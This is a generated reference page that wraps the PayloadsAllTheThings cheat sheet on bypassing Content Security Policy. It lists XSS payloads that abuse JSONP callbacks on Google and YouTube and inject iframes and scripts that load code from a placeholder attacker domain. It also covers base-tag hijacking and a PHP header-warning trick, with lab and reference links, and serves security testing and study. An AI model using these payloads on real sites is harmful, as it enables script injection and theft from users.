---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# CSP Bypass

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-xss-injection-4-csp-bypass` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XSS Injection/4 - CSP Bypass.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [CSP Bypass](../../topics/xss-injection/csp-bypass.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-xss-injection-4-csp-bypass |
| name | CSP Bypass |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/4%20-%20CSP%20Bypass.md |

## Preserved Source Material

````yaml
_body: "# CSP Bypass\n\n> A Content Security Policy (CSP) is a security feature that helps prevent cross-site scripting (XSS),\
  \ data injection attacks, and other code-injection vulnerabilities in web applications. It works by specifying which sources\
  \ of content (like scripts, styles, images, etc.) are allowed to load and execute on a webpage.\n\n## Summary\n\n- [Tools](#tools)\n\
  - [Bypass CSP using JSONP](#bypass-csp-using-jsonp)\n- [Bypass CSP default-src](#bypass-csp-default-src)\n- [Bypass CSP\
  \ inline eval](#bypass-csp-inline-eval)\n- [Bypass CSP unsafe-inline](#bypass-csp-unsafe-inline)\n- [Bypass CSP script-src\
  \ self](#bypass-csp-script-src-self)\n- [Bypass CSP script-src data](#bypass-csp-script-src-data)\n- [Bypass CSP nonce](#bypass-csp-nonce)\n\
  - [Bypass CSP header sent by PHP](#bypass-csp-header-sent-by-php)\n- [Labs](#labs)\n- [References](#references)\n\n## Tools\n\
  \n- [gmsgadget.com](https://gmsgadget.com/) - GMSGadget (Give Me a Script Gadget) is a collection of JavaScript gadgets\
  \ that can be used to bypass XSS mitigations such as Content Security Policy (CSP) and HTML sanitizers like DOMPurify.\n\
  - [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) - CSP Evaluator allows developers and security experts\
  \ to check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks.\n\n##\
  \ Bypass CSP using JSONP\n\n**Requirements**:\n\n- CSP: `script-src 'self' https://www.google.com https://www.youtube.com;\
  \ object-src 'none';`\n\n**Payload**:\n\nUse a callback function from a whitelisted source listed in the CSP.\n\n- Google\
  \ Search: `//google.com/complete/search?client=chrome&jsonp=alert(1);`\n- Google Account: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`\n\
  - Google Translate: `https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();`\n- Youtube: `https://www.youtube.com/oembed?callback=alert;`\n\
  - [Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)\n- [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)\n\
  \n```js\n<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>\"\n```\n\n## Bypass CSP default-src\n\
  \n**Requirements**:\n\n- CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`,\n\n**Payload**:\n\n`http://example.lab/csp.php?xss=f=document.createElement%28\"\
  iframe\"%29;f.id=\"pwn\";f.src=\"/robots.txt\";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//[ATTACKER.DOMAIN.TLD]/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;`\n\
  \n```js\nscript=document.createElement('script');\nscript.src='//[ATTACKER.DOMAIN.TLD]/csp.js';\nwindow.frames[0].document.head.appendChild(script);\n\
  ```\n\nSource: [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)\n\
  \n## Bypass CSP inline eval\n\n**Requirements**:\n\n- CSP `inline` or `eval`\n\n**Payload**:\n\n```js\nd=document;f=d.createElement(\"\
  iframe\");f.src=d.querySelector('link[href*=\".css\"]').href;d.body.append(f);s=d.createElement(\"script\");s.src=\"https://[ATTACKER.DOMAIN.TLD]\"\
  ;setTimeout(function(){f.contentWindow.document.head.append(s);},1000)\n```\n\nSource: [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)\n\
  \n## Bypass CSP script-src self\n\n**Requirements**:\n\n- CSP like `script-src self`\n\n**Payload**:\n\n```js\n<object data=\"\
  data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>\n```\n\nSource: [@akita_zen](https://twitter.com/akita_zen)\n\
  \n## Bypass CSP script-src data\n\n**Requirements**:\n\n- CSP like `script-src 'self' data:` as warned about in the official\
  \ [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).\n\
  \n**Payload**:\n\n```javascript\n<script src=\"data:,alert(1)\">/</script>\n```\n\nSource: [@404death](https://twitter.com/404death/status/1191222237782659072)\n\
  \n## Bypass CSP unsafe-inline\n\n**Requirements**:\n\n- CSP: `script-src https://google.com 'unsafe-inline';`\n\n**Payload**:\n\
  \n```javascript\n\"/><script>alert(1);</script>\n```\n\n## Bypass CSP nonce\n\n**Requirements**:\n\n- CSP like `script-src\
  \ 'nonce-RANDOM_NONCE'`\n- Imported JS file with a relative link: `<script src='/PATH.js'></script>`\n\n**Payload**:\n\n\
  - Inject a base tag.\n\n  ```html\n  <base href=http://[ATTACKER.DOMAIN.TLD]>\n  ```\n\n- Host your custom js file at the\
  \ same path that one of the website's script.\n\n  ```ps1\n  http://[ATTACKER.DOMAIN.TLD]/PATH.js\n  ```\n\n## Bypass CSP\
  \ header sent by PHP\n\n**Requirements**:\n\n- CSP sent by PHP `header()` function\n\n**Payload**:\n\nIn default `php:apache`\
  \ image configuration, PHP cannot modify headers when the response's data has already been written. This event occurs when\
  \ a warning is raised by PHP engine.\n\nHere are several ways to generate a warning:\n\n- 1000 $_GET parameters\n- 1000\
  \ $_POST parameters\n- 20 $_FILES\n\nIf the **Warning** are configured to be displayed you should get these:\n\n- **Warning**:\
  \ `PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in Unknown\
  \ on line 0`\n- **Warning**: `Cannot modify header information - headers already sent in /var/www/html/index.php on line\
  \ 2`\n\n```ps1\nGET /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[REPEATED &a 1000 times]&a&a&a&a\n```\n\nSource: [@pilvar222](https://twitter.com/pilvar222/status/1784618120902005070)\n\
  \n## Labs\n\n- [Root Me - CSP Bypass - Inline Code](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Inline-code)\n\
  - [Root Me - CSP Bypass - Nonce](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce)\n- [Root Me - CSP Bypass\
  \ - Nonce 2](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce-2)\n- [Root Me - CSP Bypass - Dangling Markup](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Dangling-markup)\n\
  - [Root Me - CSP Bypass - Dangling Markup 2](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Dangling-markup-2)\n\
  - [Root Me - CSP Bypass - JSONP](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-JSONP)\n\n## References\n\n\
  - [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities - Brett Buerhaus\
  \ (@bbuerhaus) - March 8, 2017](https://web.archive.org/web/20170330144550/https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/)\n\
  - [D1T1 - So We Broke All CSPs - Michele Spagnuolo and Lukas Weichselbaum - June 27, 2017](http://web.archive.org/web/20170627043828/https://conference.hitb.org/hitbsecconf2017ams/materials/D1T1%20-%20Michele%20Spagnuolo%20and%20Lukas%20Wilschelbaum%20-%20So%20We%20Broke%20All%20CSPS.pdf)\n\
  - [How to use Google’s CSP Evaluator to bypass CSP - Thomas Orlita - September 9, 2018](https://web.archive.org/web/20260220005424/https://websecblog.com/vulns/google-csp-evaluator/)\n\
  - [Making an XSS triggered by CSP bypass on Twitter - wiki.ioin.in(查看原文) - April 6, 2020](https://web.archive.org/web/20260226005506/https://www.buaq.net/go-25883.html)"
_relative_path: XSS Injection/4 - CSP Bypass.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XSS Injection/4 - CSP Bypass.md
````
